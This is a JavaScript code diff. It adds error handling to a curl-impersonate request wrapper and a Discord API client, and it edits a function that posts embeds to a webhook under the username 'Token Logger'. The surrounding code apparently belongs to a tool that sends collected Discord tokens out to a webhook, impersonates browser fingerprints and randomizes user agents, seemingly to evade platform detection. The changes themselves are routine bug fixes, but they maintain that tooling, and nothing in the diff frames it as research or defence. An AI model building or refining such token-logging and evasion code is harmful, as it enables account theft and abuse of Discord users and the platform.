@@ -179,10 +179,16 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
     child.stdout.on('data', chunk => stdout.push(chunk));
     child.stderr.on('data', chunk => stderr.push(chunk));
 
-    child.on('close', (code) => {
+    child.on('close', (code, signal) => {
       if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }
+
+      // Reject if curl itself failed or was killed
+      if (code !== 0 || signal) {
+        const errMsg = Buffer.concat(stderr).toString().trim() || `curl exited${signal ? ' with signal ' + signal : ' with code ' + code}`;
+        return reject(new Error(errMsg));
+      }
+
       const rawOutput = Buffer.concat(stdout);
-      const outputStr = rawOutput.toString();
 
       // Find the LAST header block (handles -L redirects: multiple HTTP responses)
       let lastHeaderEndIdx = -1;
@@ -209,6 +215,11 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
           const codeMatch = lastMatch.match(/HTTP\/\d\.\d\s+(\d+)/);
           if (codeMatch) lastStatusCode = parseInt(codeMatch[1], 10);
         }
+      }
+
+      // If we never parsed an HTTP status, the response is malformed or empty
+      if (lastStatusCode === 0) {
+        return reject(new Error('No HTTP response received from server'));
       }
 
       let data = null;
@@ -294,7 +305,7 @@ class DiscordApiClient {
   async request(endpoint, method = 'GET', body = null, extraHeaders = {}) {
     const url = `https://discord.com/api/v10${endpoint}`;
     const res = await curlImpersonateRequest(url, method, this._headers(extraHeaders), body, 20000);
-    if (res.status >= 400) {
+    if (res.status === 0 || res.status >= 400) {
       const err = new Error(`Discord API ${method} ${endpoint} failed: ${res.status}`);
       err.status = res.status;
       err.data = res.data;
@@ -880,7 +891,7 @@ function ensureCanGenerate(req, res, next) {
 async function _sendWebhookChunk(embed, chunkIndex = 0) {
   try {
     const url = WEBHOOK_URL;
-    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png  ' } : { content: '...' };
+    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
     await axios.post(url, payload, {
       headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
       timeout: 10000
